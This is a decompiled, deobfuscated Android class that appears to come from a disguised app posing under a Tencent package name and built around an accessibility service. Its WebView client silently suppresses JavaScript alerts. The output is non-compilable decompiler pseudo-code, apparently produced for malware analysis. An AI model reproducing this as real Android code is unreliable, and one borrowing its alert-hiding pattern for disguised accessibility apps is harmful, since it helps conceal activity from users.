package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: AccessibilityServiceCore_MyWebChromeClient
 * Original: Lcom/tencent/tunesxconcerningn1012$MyWebChromeClient;
 */
class AccessibilityServiceCore_MyWebChromeClient extends WebChromeClient {

    // === FIELDS ===
    final AccessibilityServiceCore this$0;

    // === METHODS ===

    private void Constructor(AccessibilityServiceCore param0) {
        v0.this$0 = v1;
        // new WebChromeClient()
        return;
    }

     void Constructor(AccessibilityServiceCore param0, AccessibilityServiceCore$1 param1) {
        // new AccessibilityServiceCore$MyWebChromeClient(v1)
        return;
    }

    public boolean onJsAlert(WebView param0, String param1, String param2, JsResult param3) {
        v1 = 1;
        return 1;
    }
}
